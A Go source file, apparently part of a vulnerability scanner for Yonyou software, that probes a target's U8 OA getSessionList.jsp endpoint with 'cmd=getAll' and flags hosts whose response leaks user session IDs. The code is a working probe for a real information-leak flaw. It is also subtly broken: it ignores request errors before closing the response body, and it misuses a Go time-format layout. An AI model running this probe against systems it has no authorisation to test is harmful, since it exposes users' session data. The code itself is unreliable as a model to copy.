package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func GetSessionListScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	getSessionList := "用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞"
	response, _ := client.Get(address + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll")
	defer response.Body.Close()
	if response.StatusCode == http.StatusOK {
		body, _ := ioutil.ReadAll(response.Body)
		if strings.Contains(string(body), "usrID") {
			result5 := getSessionList + "：" + address + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result5, filename) // 保存结果到文本文件
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			log.Println(Green + "[+] 存在" + getSessionList + "：" + address + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll" + Reset)
		} else {
			output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, getSessionList)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, getSessionList)
		fmt.Println(output)
	}
}
